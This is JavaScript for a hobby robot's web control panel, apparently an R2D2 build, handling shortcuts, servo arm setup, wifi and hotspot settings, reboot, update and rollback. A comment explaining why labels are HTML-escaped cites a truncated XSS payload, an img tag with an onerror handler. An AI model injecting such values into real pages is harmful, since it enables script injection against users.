      icon.textContent = sc.icon || '⚡';
      btn.appendChild(icon);

      if (sc.label) {
        const lbl = document.createElement('span');
        lbl.className = 'shortcut-label';
        lbl.textContent = sc.label;
        btn.appendChild(lbl);
      }

      btn.addEventListener('click', () => this._trigger(sc.id, btn));
      // WOW M4-W 2026-05-15: long-press (600ms) opens Settings →
      // Shortcuts so operator can fix a misconfigured shortcut
      // without leaving Drive → digging through menus. Uses
      // pointerdown/up + a guarded timer so a normal click still
      // fires the action (the timer cancels at <600ms via pointerup).
      let _lpTimer = null;
      let _lpFired = false;
      btn.addEventListener('pointerdown', () => {
        _lpFired = false;
        _lpTimer = setTimeout(() => {
          _lpFired = true;
          switchTab('settings');
          switchSettingsPanel('shortcuts');
          toast('Long-press → edit shortcut', 'info');
        }, 600);
      });
      btn.addEventListener('pointerup', () => {
        if (_lpTimer) { clearTimeout(_lpTimer); _lpTimer = null; }
      });
      btn.addEventListener('pointerleave', () => {
        if (_lpTimer) { clearTimeout(_lpTimer); _lpTimer = null; }
      });
      // Suppress the synthetic click if long-press fired (otherwise
      // we'd both switch panels AND trigger the action).
      btn.addEventListener('click', (e) => { if (_lpFired) { e.stopImmediatePropagation(); _lpFired = false; } }, true);
      btn.title = (sc.label || '') + ' — long-press to edit';
      dest.appendChild(btn);
      this._btnById[sc.id] = btn;
    });
  },

  // Called every status-poll tick (~2s) with the /status payload.
  // For one-shot actions (play_choreo/play_sound/play_random_audio)
  // we mirror the real playback state from the server: button is
  // green while reg.choreo_name / reg.audio_current matches the
  // shortcut target, normal otherwise. For toggle actions
  // (arms/panels) the source of truth is /shortcuts._states and is
  // updated at click + on /shortcuts refresh, so we leave them alone
  // here.
  updateFromStatus(data) {
    if (!this._shortcuts || !this._shortcuts.length) return;
    if (!data) return;
    // E7 fix 2026-05-16: sync toggle states from /status.shortcut_states
    // so two browser tabs (web + Android) stay in sync without full
    // /shortcuts refetch. Without this, tab A pressing arms_toggle
    // left tab B's indicator stale until full reload.
    if (data.shortcut_states && typeof data.shortcut_states === 'object') {
      for (const sid of Object.keys(data.shortcut_states)) {
        this._states[sid] = data.shortcut_states[sid];
        const b = this._btnById[sid];
        if (b) b.classList.toggle('is-on', this._states[sid] === 'on');
      }
    }
    const choreoName = data.choreo_playing ? (data.choreo_name || '') : '';
    const audioCur   = data.audio_playing  ? (data.audio_current || '') : '';
    // audio_current looks like '🎲 happy' for random-category plays, plain
    // sound name otherwise. Strip the '🎲 ' prefix to recover the category.
    const randomCat = audioCur.startsWith('🎲 ') ? audioCur.slice(2).trim() : '';

    this._shortcuts.forEach(sc => {
      const btn = this._btnById && this._btnById[sc.id];
      if (!btn) return;
      const type   = sc.action?.type || 'none';
      const target = sc.action?.target || '';
      let active = false;
      if (type === 'play_choreo') {
        active = !!choreoName && choreoName === target;
      } else if (type === 'play_sound') {
        active = !!audioCur && audioCur === target;
      } else if (type === 'play_random_audio') {
        // Backend tags random plays with '🎲 <category>', so we can
        // tell precisely which category-shortcut is "owning" the
        // playback right now.
        active = !!randomCat && randomCat === target;
      } else {
        return;   // toggles handled by _states, don't touch
      }
      btn.classList.toggle('is-playing', active);
    });
  },

  async _trigger(id, btn) {
    btn.disabled = true;
    try {
      // B19 fix 2026-05-16: use apiDetail to surface backend error
      // messages (busy: 409, refused: 503, debounced: 429) instead of
      // generic 'Shortcut failed'.
      const res = await apiDetail(`/shortcuts/${encodeURIComponent(id)}/trigger`, 'POST');
      if (!res.ok) {
        // B2/B3/B4 toast — 'another sequence playing', 'UART unavail', etc.
        const msg = res.error || 'Shortcut failed';
        const kind = res.status === 429 ? 'info' : 'error';
        toast(msg, kind);
        return;
      }
      const d = res.data || {};
      if (d.error) {
        toast(`Shortcut: ${d.error}`, 'error');
        return;
      }
      const state = d.state;
      this._states[id] = state === 'fired' ? 'off' : state;
      btn.classList.toggle('is-on', this._states[id] === 'on');
      if (state === 'fired') {
        btn.classList.add('is-playing');
        // B8 fix 2026-05-16: was relying on updateFromStatus to clear
        // is-playing, but play_animation + future one-shot types aren't
        // monitored → green forever. Look up the action type and use a
        // hard 800ms clear for one-shot fire types.
        const sc = this._shortcuts.find(s => s.id === id);
        const oneShotTypes = new Set(['play_animation']);
        if (sc && oneShotTypes.has(sc.action?.type)) {
          setTimeout(() => btn.classList.remove('is-playing'), 800);
        } else {
          setTimeout(() => {
            if (poller && poller._lastData) shortcutsRunner.updateFromStatus(poller._lastData);
          }, 2500);
        }
      }
    } finally {
      btn.disabled = false;
    }
  },
};


// ─── Arms config ──────────────────────────────────────────────────────────────
const armsConfig = {
  _count:  0,
  _servos: ['', '', '', '', '', ''],   // 6 slots, servo IDs (never labels)
  _panels: ['', '', '', '', '', ''],   // 6 slots, body panel that opens before arm extends
  _delays: [0.5, 0.5, 0.5, 0.5, 0.5, 0.5], // 6 slots, seconds between panel open and arm extension
  _labels: {},                         // {Servo_S0: 'My Label', ...}

  async load() {
    const [armsData, settingsData] = await Promise.all([
      api('/servo/arms'),
      api('/servo/settings'),
    ]);
    if (!armsData) return;
    this._count  = armsData.count  || 0;
    this._servos = armsData.servos || ['', '', '', '', '', ''];
    this._panels = armsData.panels || ['', '', '', '', '', ''];
    this._delays = armsData.delays || [0.5, 0.5, 0.5, 0.5, 0.5, 0.5];
    // Body servo total from HAT info
    const bodyHats = settingsData?.body_hats || [{ servos: Array.from({length:16}, (_,i) => `Servo_S${i}`) }];
    this._bodyServos = bodyHats.flatMap(h => h.servos);
    // Build label map — only body servos (Servo_S*)
    const panels = settingsData?.panels || {};
    this._labels = {};
    for (const [id, cfg] of Object.entries(panels)) {
      if (id.startsWith('Servo_S')) this._labels[id] = cfg.label || id;
    }
    // B-234 / B-235 (remaining tabs audit 2026-05-15): focus-guard.
    // arms-count is a numeric input the admin types into. Without the
    // guard, a tab switch or reload mid-edit wipes the value while
    // the cursor is still in the field. Same pattern as B-245.
    const countEl = el('arms-count');
    if (countEl && !countEl.matches(':focus')) countEl.value = String(this._count);
    this._renderSelectors();
  },

  _renderSelectors() {
    const container = el('arms-selectors');
    if (!container) return;
    if (this._count === 0) { container.innerHTML = ''; return; }
    const allBodyServos = this._bodyServos || Array.from({length:16}, (_,j) => `Servo_S${j}`);
    const panelServos   = allBodyServos.slice(0, 16);
    // B-41 (audit 2026-05-15): the servo label comes from operator
    // input via /servo/settings (B-36 now admin-gated, B-68 still
    // has no character filter). Escape both id and text so a
    // malicious `<img src=x onerror=…>` label can't break out of
    // the <option> body. id is regex-safe today (Servo_S\d+) but
    // belt-and-suspenders.
    const mkOpts = (list, selected) => list.map(id => {
      const lbl  = this._labels[id] || id;
      const text = lbl !== id ? `${lbl} (${id})` : id;
      const sel  = id === selected ? ' selected' : '';
      return `<option value="${escapeHtml(id)}"${sel}>${escapeHtml(text)}</option>`;
    }).join('');
    let html = `<div class="arms-grid arms-grid-with-test">
      <div class="arms-gh">#</div>
      <div class="arms-gh">Arm servo</div>
      <div class="arms-gh">Body panel</div>
      <div class="arms-gh">Delay (s)</div>
      <div class="arms-gh">Test</div>`;
    for (let i = 0; i < this._count; i++) {
      const delay = (this._delays[i] ?? 0.5).toFixed(1);
      html += `
      <div class="arms-gl">ARM ${i + 1}</div>
      <select id="arm-servo-${i}" class="input-text" style="font-size:.78em;padding:3px 4px">
        <option value="">— none —</option>${mkOpts(allBodyServos, this._servos[i])}
      </select>
      <select id="arm-panel-${i}" class="input-text" style="font-size:.78em;padding:3px 4px">
        <option value="">— none —</option>${mkOpts(panelServos, this._panels[i])}
      </select>
      <input id="arm-delay-${i}" type="number" class="input-text" min="0.1" max="5.0" step="0.1"
             value="${delay}" style="width:60px;font-size:.82em;padding:3px 4px">
      <button class="btn btn-sm arms-test-btn" data-arm-idx="${i}" title="Open panel → wait delay → open arm → close all (uses current row values)">▶ TEST</button>`;
    }
    html += '</div>';
    container.innerHTML = html;
    container.querySelectorAll('.arms-test-btn').forEach(btn => {
      btn.addEventListener('click', () => this._testRow(parseInt(btn.dataset.armIdx, 10)));
    });
    // W2 fix 2026-05-16: live conflict detection — wire onchange to
    // every servo/panel select so operator sees duplicates immediately.
    container.querySelectorAll('select[id^="arm-servo-"], select[id^="arm-panel-"]').forEach(sel => {
      sel.addEventListener('change', () => this._checkConflicts());
    });
    this._checkConflicts();
  },

  _checkConflicts() {
    const warn = el('arms-conflict-warn');
    if (!warn) return;
    const seen = {};   // servoId → [labels]
    for (let i = 0; i < this._count; i++) {
      const sv = el(`arm-servo-${i}`)?.value || '';
      const pn = el(`arm-panel-${i}`)?.value || '';
      if (sv) (seen[sv] = seen[sv] || []).push(`Arm${i+1} arm`);
      if (pn) (seen[pn] = seen[pn] || []).push(`Arm${i+1} panel`);
    }
    const conflicts = Object.entries(seen).filter(([_, uses]) => uses.length > 1);
    if (conflicts.length === 0) {
      warn.style.display = 'none';
      warn.textContent = '';
    } else {
      warn.style.display = '';
      warn.innerHTML = '';
      const head = document.createElement('strong');
      head.textContent = '⚠ Duplicate servo assignments — SAVE will be rejected:';
      warn.appendChild(head);
      conflicts.forEach(([sv, uses]) => {
        const li = document.createElement('div');
        li.textContent = `· ${sv}: ${uses.join(' + ')}`;
        warn.appendChild(li);
      });
    }
  },

  async _testRow(idx) {
    const armServo   = el(`arm-servo-${idx}`)?.value || '';
    const panelServo = el(`arm-panel-${idx}`)?.value || '';
    const delay      = parseFloat(el(`arm-delay-${idx}`)?.value) || 0.5;
    if (!armServo) { toast('Pick an arm servo first', 'warn'); return; }
    // Post-audit fix 2026-05-15 (M-1): gate on E-STOP / stow state.
    // Without this, the HTTP calls succeed (slave silently no-ops
    // because FREEZE=1) and the button shows 'OK ✓' even though the
    // servos never moved → operator misreads test result.
    const st = await api('/status').catch(() => null);
    if (st && st.estop_active) {
      toast('Cannot test — E-STOP active. Reset first.', 'error');
      return;
    }
    if (st && st.stow_in_progress) {
      toast('Cannot test — robot is stowing. Wait a moment.', 'warn');
      return;
    }
    const btn = document.querySelector(`.arms-test-btn[data-arm-idx="${idx}"]`);
    try {
      await withSaveFeedback(btn, async () => {
        // Open panel (if any), wait delay, open arm, then close both
        // after a brief hold so operator can see the result. Uses the
        // generic /servo/<side>/open endpoint with the current selections.
        if (panelServo) {
          await api('/servo/body/open', 'POST', { name: panelServo });
          await new Promise(r => setTimeout(r, delay * 1000));
        }
        await api('/servo/body/open', 'POST', { name: armServo });
        await new Promise(r => setTimeout(r, 1500));
        await api('/servo/body/close', 'POST', { name: armServo });
        await new Promise(r => setTimeout(r, delay * 1000));
        if (panelServo) await api('/servo/body/close', 'POST', { name: panelServo });
        return { status: 'ok' };
      }, { saving: 'TESTING…', saved: 'OK ✓', failed: 'FAILED' });
    } catch {
      toast('Test failed — check logs', 'error');
    }
  },

  onCountChange() {
    this._count = parseInt(el('arms-count')?.value) || 0;
    this._renderSelectors();
  },

  async save() {
    const count  = parseInt(el('arms-count')?.value) || 0;
    const servos = Array.from({length: 6}, (_, i) => el(`arm-servo-${i}`)?.value || '');
    const panels = Array.from({length: 6}, (_, i) => el(`arm-panel-${i}`)?.value || '');
    // M1 fix 2026-05-16: was 'parseFloat(...) || 0.5' but parseFloat('0')
    // returns 0 (falsy) → operator entering 0 silently became 0.5.
    // Also: NaN-safe via Number.isFinite.
    const delays = Array.from({length: 6}, (_, i) => {
      const v = parseFloat(el(`arm-delay-${i}`)?.value);
      return Number.isFinite(v) ? Math.max(0.1, Math.min(5, v)) : 0.5;
    });
    // W3 fix 2026-05-16: confirm before destructive count reduction
    // (user-reported pain: 'efface mes configs').
    if (count < this._count) {
      const lost = [];
      for (let i = count; i < this._count; i++) {
        if (this._servos[i] || this._panels[i]) lost.push(`Arm${i+1}`);
      }
      if (lost.length && !confirm(
        `Reducing arms count from ${this._count} to ${count}.\n\n` +
        `This will UNASSIGN and REVERT auto-labels for: ${lost.join(', ')}.\n\n` +
        `Custom servo labels (e.g. 'Arm3_Pince') are now preserved (fix B1).\n\n` +
        `Continue?`
      )) {
        return false;
      }
    }
    const status = el('arms-status');
    if (status) { status.textContent = 'Saving…'; status.className = 'settings-status'; }
    // B5/L5 fix 2026-05-16: apiDetail surfaces backend validation
    // errors (duplicate servo, bad delay) as actionable toasts.
    const res = await apiDetail('/servo/arms', 'POST', { count, servos, panels, delays });
    if (res.ok && res.data?.status === 'ok') {
      this._count  = res.data.count;
      this._servos = res.data.servos;
      this._panels = res.data.panels;
      this._delays = res.data.delays || [0.5, 0.5, 0.5, 0.5, 0.5, 0.5];
      toast(`Arms: ${count} arm(s) configured`, 'ok');
      if (status) { status.textContent = `${count} arm(s) saved`; status.className = 'settings-status ok'; }
      return true;
    }
    const errMsg = res.error || 'Failed to save arms config';
    toast(errMsg, 'error');
    if (status) { status.textContent = errMsg; status.className = 'settings-status error'; }
    return false;
  },
};

async function scanWifi() {
  const btn = el('btn-scan');
  if (btn) {
    btn.textContent = 'SCANNING…';
    btn.disabled = true;
    btn.classList.add('bt-scanning');   // re-use the pulse animation
  }
  const data = await api('/settings/wifi/scan');
  if (btn) {
    btn.textContent = 'SCAN';
    btn.disabled = false;
    btn.classList.remove('bt-scanning');
  }

  // WOW polish I5 2026-05-15: render results as a custom card list
  // instead of <select> so we can show actual SVG signal bars + lock
  // icons. <option> can't be styled with SVG. The hidden select stays
  // for fallback compatibility (form value tracking).
  const sel  = el('wifi-scan-list');
  const list = el('wifi-scan-card-list');
  if (!sel) return;

  if (!data || !data.networks || data.networks.length === 0) {
    sel.innerHTML = '<option value="">No networks found</option>';
    if (list) list.replaceChildren();
    toast('No networks detected on wlan1', 'warn');
    return;
  }
  // Sort by signal desc
  const nets = [...data.networks].sort((a, b) => (b.signal || 0) - (a.signal || 0));

  // Hidden select for form state
  sel.innerHTML = '<option value="">— Select network —</option>' +
    nets.map(n => `<option value="${escapeHtml(n.ssid)}">${escapeHtml(n.ssid)}</option>`).join('');

  // Visible card list with SVG bars + lock icon
  if (list) {
    list.replaceChildren();
    nets.forEach(n => {
      const row = document.createElement('button');
      row.type = 'button';
      row.className = 'wifi-scan-card';
      // W3 fix 2026-05-16: highlight currently-connected SSID (backend
      // now returns 'in_use' from nmcli IN-USE column).
      if (n.in_use) row.classList.add('is-connected');
      row.dataset.ssid = n.ssid;
      row.addEventListener('click', () => {
        sel.value = n.ssid;
        onScanSelect(n.ssid);
        list.querySelectorAll('.wifi-scan-card').forEach(c => c.classList.remove('selected'));
        row.classList.add('selected');
      });
      const bars = document.createElement('span');
      bars.className = 'signal-bars';
      const lit = n.signal >= 75 ? 4 : n.signal >= 50 ? 3 : n.signal >= 25 ? 2 : 1;
      const cls = n.signal >= 50 ? '' : n.signal >= 25 ? 'weak' : 'bad';
      for (let i = 1; i <= 4; i++) {
        const b = document.createElement('span');
        b.className = `signal-bar signal-bar-${i} ${i <= lit ? 'lit ' + cls : ''}`;
        bars.appendChild(b);
      }
      const ssidEl = document.createElement('span');
      ssidEl.className = 'wifi-scan-ssid';
      ssidEl.textContent = n.ssid;
      const meta = document.createElement('span');
      meta.className = 'wifi-scan-meta';
      // W11 fix 2026-05-16: show band (2.4G/5G) when available
      const parts = [`${n.signal}%`];
      if (n.band) parts.push(n.band);
      if (n.security) parts.push('🔒');
      meta.textContent = parts.join(' · ');
      // W3 current marker badge
      if (n.in_use) {
        const badge = document.createElement('span');
        badge.className = 'wifi-current-badge';
        badge.textContent = '✓ CURRENT';
        row.append(bars, ssidEl, meta, badge);
      } else {
        row.append(bars, ssidEl, meta);
      }
      list.appendChild(row);
    });
  }
}

function onScanSelect(ssid) {
  if (ssid) { const f = el('wifi-ssid'); if (f) f.value = ssid; }
}

// W4 fix 2026-05-16: password show/hide eye toggle helper.
// Applied to wlan1 password + hotspot password inputs.
function togglePwdVisibility(inputId, btn) {
  const inp = el(inputId);
  if (!inp) return;
  if (inp.type === 'password') {
    inp.type = 'text';
    if (btn) { btn.textContent = '🙈'; btn.setAttribute('aria-label', 'Hide password'); }
    // Auto-revert after 5s
    setTimeout(() => {
      if (inp.type === 'text') {
        inp.type = 'password';
        if (btn) { btn.textContent = '👁'; btn.setAttribute('aria-label', 'Show password'); }
      }
    }, 5000);
  } else {
    inp.type = 'password';
    if (btn) { btn.textContent = '👁'; btn.setAttribute('aria-label', 'Show password'); }
  }
}

// W5 fix 2026-05-16: WPA-PSK strength meter for hotspot password.
// Reuses .signal-bars SVG component (lit count from char-class score).
function updateHotspotPwdStrength(pwd) {
  const wrap = el('hotspot-pwd-strength');
  const label = el('hotspot-pwd-strength-label');
  if (!wrap) return;
  if (!pwd) { wrap.style.display = 'none'; return; }
  wrap.style.display = '';
  // Score: 1pt for length≥8, 1pt for length≥12, 1pt each for class
  // (lower/upper/digit/symbol). Max 5 → mapped to 4 lit bars.
  let score = 0;
  if (pwd.length >= 8) score++;
  if (pwd.length >= 12) score++;
  if (/[a-z]/.test(pwd)) score++;
  if (/[A-Z]/.test(pwd)) score++;
  if (/[0-9]/.test(pwd)) score++;
  if (/[^A-Za-z0-9]/.test(pwd)) score++;
  const lit = Math.min(4, Math.max(1, Math.ceil(score / 1.5)));
  const tier = score <= 2 ? 'bad' : score <= 3 ? 'weak' : '';
  const tierLabel = score <= 2 ? 'weak' : score <= 4 ? 'good' : 'strong';
  wrap.querySelectorAll('.signal-bar').forEach((b, i) => {
    b.classList.remove('lit', 'weak', 'bad');
    if (i < lit) {
      b.classList.add('lit');
      if (tier) b.classList.add(tier);
    }
  });
  if (label) {
    label.textContent = tierLabel.toUpperCase();
    label.style.color = score <= 2 ? 'var(--err)' : score <= 4 ? 'var(--amber)' : 'var(--ok)';
  }
}

// W1/E16 fix 2026-05-16: withSaveFeedback wrapper for visual parity +
// button disabled during in-flight (prevents double-fire). Uses
// apiDetail to surface backend error messages.
async function applyWifi() {
  const ssid     = (el('wifi-ssid')?.value || '').trim();
  const password = el('wifi-password')?.value || '';
  // E4 fix 2026-05-16: validate BEFORE confirm (was showing
  // 'Switch wlan1 to ""?' on empty SSID).
  if (!ssid) { toast('SSID required', 'error'); return; }
  // E13 fix 2026-05-16: no-op short-circuit if same SSID + blank pwd
  // (don't drop wlan1 for a redundant click).
  const loadedSsid = window._loadedWifiSsid || '';
  if (ssid === loadedSsid && !password) {
    toast('No changes — skipping wlan1 cycle', 'info');
    return;
  }
  if (!confirm(`Switch wlan1 to "${ssid}"?\n\nThe current wlan1 connection will be dropped during reconnect. If your browser is on wlan1, you'll lose the page — reconnect via the hotspot (192.168.4.1) to verify.`)) return;
  const btn = document.querySelector('#spanel-network button[onclick*="applyWifi"]');
  const run = async () => {
    const res = await apiDetail('/settings/wifi', 'POST', { ssid, password });
    if (!res.ok) {
      // B6 fix 2026-05-16: explicit guidance when wlan1 dropped the
      // request itself (network error after disconnect).
      if (res.error === 'timeout' || res.status === 0) {
        toast('wlan1 dropped — reconnect via hotspot (192.168.4.1) to verify status', 'warn');
      } else {
        toast(res.error || 'Connection failed', 'error');
      }
      return false;
    }
    const d = res.data || {};
    toast(d.message || (d.connected ? 'wlan1 connected ✓' : 'Config saved — will connect on next boot'),
          d.connected ? 'ok' : 'warn');
    await loadSettings();
    return true;
  };
  if (btn && typeof withSaveFeedback === 'function') withSaveFeedback(btn, run);
  else run();
}

async function applyHotspot() {
  const ssid     = (el('hotspot-ssid')?.value || '').trim();
  const password = el('hotspot-password')?.value || '';
  if (!ssid) { toast('SSID required', 'error'); return; }
  if (password && password.length < 8) { toast('Password: minimum 8 characters', 'error'); return; }
  // E14 fix 2026-05-16: no-op short-circuit
  const loadedHotspot = window._loadedHotspotSsid || '';
  if (ssid === loadedHotspot && !password) {
    toast('No changes — skipping hotspot restart', 'info');
    return;
  }
  if (!confirm(`Apply hotspot SSID "${ssid}"?\n\nALL WiFi clients (including this browser if you're on the hotspot) will be disconnected for ~5s.`)) return;
  const btn = document.querySelector('#spanel-network button[onclick*="applyHotspot"]');
  const run = async () => {
    const res = await apiDetail('/settings/hotspot', 'POST', { ssid, password });
    if (!res.ok) {
      if (res.error === 'timeout' || res.status === 0) {
        toast('Hotspot restarting — reconnect with new credentials within 30s', 'warn');
      } else {
        toast(res.error || 'Hotspot update failed', 'error');
      }
      return false;
    }
    toast('Hotspot updated ✓ — clients reconnect required', 'ok');
    const pw = el('hotspot-password');
    if (pw) pw.value = '';
    await loadSettings();
    return true;
  };
  if (btn && typeof withSaveFeedback === 'function') withSaveFeedback(btn, run);
  else run();
}

// B-74 (audit 2026-05-15): snapshot of last-loaded config values so
// saveConfig() can send only what changed. Was sending all 4 fields
// every save regardless, which widened the race window with concurrent
// /servo/arms (different blueprint, same local.cfg) and triggered
// _sync_remote_url even when the URL hadn't really changed.
let _deployCfgBaseline = {};

async function saveConfig() {
  if (!confirm('Save deploy config?\n\nRepo URL / branch / slave host changes take effect on next git pull or reboot.')) return;
  const current = {
    'github.repo_url':          (el('repo-url')?.value || '').trim(),
    'github.branch':            (el('git-branch')?.value || '').trim(),
    'github.auto_pull_on_boot': el('auto-pull')?.checked ? 'true' : 'false',
    'slave.host':               (el('slave-host')?.value || '').trim(),
  };
  const payload = {};
  for (const [k, v] of Object.entries(current)) {
    if (_deployCfgBaseline[k] !== v) payload[k] = v;
  }
  if (Object.keys(payload).length === 0) {
    toast('No changes to save', 'info');
    return;
  }
  // WOW polish 2026-05-15: button feedback while the API roundtrip
  // is in flight. Find the SAVE button by event target — fall back
  // to selector if called programmatically.
  const btn = document.querySelector('#spanel-deploy button[onclick*="saveConfig"]');
  try {
    await withSaveFeedback(btn, async () => {
      const data = await api('/settings/config', 'POST', payload);
      if (!data || data.status !== 'ok') throw new Error('save failed');
      _deployCfgBaseline = { ..._deployCfgBaseline, ...payload };
      toast(`Config saved (${Object.keys(payload).length} field${Object.keys(payload).length>1?'s':''})`, 'ok');
      return data;
    });
  } catch { toast('Error saving config', 'error'); }
}

// B11 fix 2026-05-16: await api response BEFORE showing overlay so the
// safety gate / lock rejection (503) can surface as a toast instead of
// trapping the operator behind a 30s overlay for a reboot that never
// happened.
async function confirmAction(msg, endpoint, isServiceRestart) {
  if (!confirm(msg)) return;
  // W6 fix 2026-05-16: shorter overlay for service-only restart (~5s).
  const isReboot   = /\/system\/reboot/.test(endpoint);
  const isShutdown = /\/system\/shutdown/.test(endpoint);
  const isRestart  = isServiceRestart || /\/system\/restart_master/.test(endpoint);
  const res = await apiDetail(endpoint, 'POST');
  if (!res.ok) {
    toast(res.error || 'Command refused', 'error');
    return;
  }
  if (isReboot || isShutdown || isRestart) {
    let title, sub, countdown;
    if (isShutdown) {
      title = 'POWERING OFF';
      sub   = 'Master is shutting down — manual power cycle required to resume';
      countdown = 0;
    } else if (isRestart) {
      title = 'RESTARTING SERVICES';
      sub   = 'Master services restarting (~5s) — page will auto-reconnect';
      countdown = 10;
    } else {
      title = 'REBOOTING';
      sub   = 'The Master Pi is restarting — page will auto-reconnect';
      countdown = 30;
    }
    showRebootOverlay(title, sub, countdown, !isShutdown);
  }
  toast('Command sent', 'ok');
}

// WOW polish I3 2026-05-15: reboot/shutdown overlay manager.
// `autoReconnect` polls /status until it comes back, then hides.
function showRebootOverlay(title, sub, countdownSec, autoReconnect) {
  const overlay   = el('reboot-overlay');
  const titleEl   = el('reboot-overlay-title');
  const subEl     = overlay?.querySelector('.reboot-overlay-sub');
  const countEl   = el('reboot-overlay-countdown');
  const statusEl  = el('reboot-overlay-status');
  if (!overlay) return;
  if (titleEl)  titleEl.textContent  = title;
  if (subEl)    subEl.textContent    = sub;
  if (statusEl) {
    statusEl.textContent = 'waiting…';
    statusEl.className = 'reboot-overlay-status';
  }
  overlay.classList.add('active');

  if (!autoReconnect) {
    if (countEl) countEl.textContent = '⚡';
    return;
  }
  let remaining = Math.max(5, countdownSec | 0);
  if (countEl) countEl.textContent = String(remaining);
  const tick = setInterval(() => {
    remaining -= 1;
    if (countEl) countEl.textContent = String(Math.max(0, remaining));
    if (remaining <= 0) {
      if (statusEl) statusEl.textContent = 'reconnecting…';
    }
  }, 1000);
  // Polling for /status to come back online — usually 25-45s for a Pi reboot
  let attempts = 0;
  const poll = setInterval(async () => {
    attempts++;
    try {
      const r = await fetch((window.R2D2_API_BASE || '') + '/status',
        { cache: 'no-store', signal: AbortSignal.timeout(2000) });
      if (r.ok) {
        clearInterval(tick);
        clearInterval(poll);
        if (statusEl) {
          statusEl.textContent = 'Reconnected ✓';
          statusEl.className = 'reboot-overlay-status ok';
        }
        setTimeout(() => {
          overlay.classList.remove('active');
          location.reload();   // fresh page state post-reboot
        }, 1200);
      }
    } catch {/* still offline */}
    if (attempts > 90) {   // 3 minutes timeout
      clearInterval(tick);
      clearInterval(poll);
      if (statusEl) {
        statusEl.textContent = 'Still offline — check Master power';
        statusEl.className = 'reboot-overlay-status error';
      }
    }
  }, 2000);
}

async function systemUpdate() {
  if (!confirm('Force update?\n\ngit pull + rsync Slave + reboot Slave')) return;
  // WOW polish I2 2026-05-15: full-screen progress overlay during the
  // 30-90s deploy so operator isn't staring at a frozen UI wondering
  // 'did it work?'. Polls /system/version every 3s — when the SHA
  // changes, deploy succeeded; if Master goes offline (Pi reboot
  // during deploy) we transition to the reboot overlay.
  const startSha = await api('/system/version').then(v => v?.commit || '').catch(() => '');
  showRebootOverlay('UPDATING', 'git pull → rsync Slave → restart services', 60, false);
  const countEl  = el('reboot-overlay-countdown');
  const statusEl = el('reboot-overlay-status');
  if (countEl) countEl.textContent = '⬇';
  if (statusEl) statusEl.textContent = 'pulling latest commits…';

  const d = await api('/system/update', 'POST');
  if (!d) {
    if (statusEl) {
      statusEl.textContent = 'Update failed — admin re-auth may be needed';
      statusEl.className = 'reboot-overlay-status error';
    }
    setTimeout(() => el('reboot-overlay')?.classList.remove('active'), 3000);
    return;
  }
  if (statusEl) statusEl.textContent = 'deploying — waiting for new version…';
  let attempts = 0;
  const poll = setInterval(async () => {
    attempts++;
    try {
      const v = await api('/system/version');
      const curSha = v?.commit || '';
      if (curSha && startSha && curSha !== startSha) {
        clearInterval(poll);
        if (countEl) countEl.textContent = '✓';
        if (statusEl) {
          statusEl.textContent = `Deployed ${curSha.substring(0,7)} — reloading…`;
          statusEl.className = 'reboot-overlay-status ok';
        }
        setTimeout(() => location.reload(), 1800);
      } else if (statusEl && attempts <= 30) {
        statusEl.textContent = `deploying — ${attempts*3}s elapsed`;
      }
    } catch {/* still updating */}
    if (attempts > 45) {   // 135s timeout
      clearInterval(poll);
      if (statusEl) {
        statusEl.textContent = 'Timed out — check Slave logs · /diagnostics';
        statusEl.className = 'reboot-overlay-status error';
      }
    }
  }, 3000);
}

async function systemRollback() {
  if (!confirm('ROLLBACK to previous commit?\n\nThis will revert the last git pull, then rsync Slave and reboot it.\n\nCannot be undone easily.')) return;
  toast('Rollback started…', 'info');
  // B-113 (audit 2026-05-15): surface failure. Was fire-and-forget;
  // a 401 (admin lock expired) or 5xx silently looked successful
  // because the success toast fires whenever `d` is truthy AND null
  // is falsy, so a null return path skipped both toasts. Explicit
  // error path now.
  const d = await api('/system/rollback', 'POST');
  if (!d) {
    toast('Rollback failed — admin re-auth may be needed', 'error');
    return;
  }
  toast('Rollback in progress — Slave will reboot', 'ok');
}

// Latest recommendation cached for the APPLY button
let _uartRttRecommendation = null;

// Persists the body UART latency value currently in the input field.
// Called by APPLY & SAVE and by the input blur/Enter handlers.
// Backend hot-swaps the running ChoreoPlayer — no reboot required.
async function saveBodyUartLat() {
  const inp = el('body-uart-lat-input');
  if (!inp) return false;
  const ms = parseInt(inp.value);
  if (isNaN(ms) || ms < 0 || ms > 200) {
    toast('UART latency must be 0-200 ms', 'error');
    // B10 fix 2026-05-16: revert field to last-saved value + red flash
    // so operator sees the invalid input was rejected (was: field
    // stayed showing the bad value, looked like nothing happened).
    inp.value = _hardwareLoaded?.body_uart_lat_ms ?? 25;
    inp.classList.add('input-error');
    setTimeout(() => inp.classList.remove('input-error'), 800);
    return false;
  }
  // Skip the round-trip if the value is already what we have on file
  if (_hardwareLoaded && _hardwareLoaded.body_uart_lat_ms === ms) return true;
  const sec = (ms / 1000).toFixed(3);
  const data = await api('/settings/config', 'POST', {'choreo.body_servo_uart_lat': sec});
  if (data?.status === 'ok') {
    if (_hardwareLoaded) _hardwareLoaded.body_uart_lat_ms = ms;
    // W10 fix 2026-05-16: unified saved-pulse visual matching the
    // rest of the app (withSaveFeedback style).
    const ind = el('body-uart-lat-saved');
    if (ind) {
      ind.classList.add('is-visible');
      setTimeout(() => { ind.classList.remove('is-visible'); }, 1500);
    }
    return true;
  }
  toast('Failed to save UART latency', 'error');
  return false;
}

// Hook input → auto-save on blur or Enter so a manually-typed value persists
// without needing a separate button. Idempotent listener registration.
function _wireBodyUartLatAutoSave() {
  const inp = el('body-uart-lat-input');
  if (!inp || inp.dataset.autosaveWired) return;
  inp.addEventListener('blur', saveBodyUartLat);
  inp.addEventListener('keydown', (ev) => {
    if (ev.key === 'Enter') { ev.preventDefault(); inp.blur(); }
  });
  inp.dataset.autosaveWired = '1';
}
document.addEventListener('DOMContentLoaded', _wireBodyUartLatAutoSave);

async function measureUartRtt() {
  const stats = el('uart-rtt-stats');
  const fit   = el('uart-rtt-fit');
  const btn   = el('uart-rtt-apply-btn');
  if (stats) stats.textContent = 'Measuring…';
  if (fit)   { fit.textContent = '…'; fit.style.color = 'var(--text-dim)'; }
  if (btn)   btn.disabled = true;

  const data = await api('/diagnostics/uart_rtt');
  if (!data || data.count === 0) {
    if (stats) stats.textContent = data?.error || 'No samples yet — wait ~40s after Master start.';
    return;
  }

  // B9 fix 2026-05-16: render via createElement+textContent instead
  // of innerHTML interpolation (CLAUDE.md XSS-safe rendering rule).
  // Values are numeric from a trusted endpoint today; this closes the
  // sink for future string fields and matches the project pattern.
  // W7 fix: also render a mini horizontal bar showing min→p50→p95
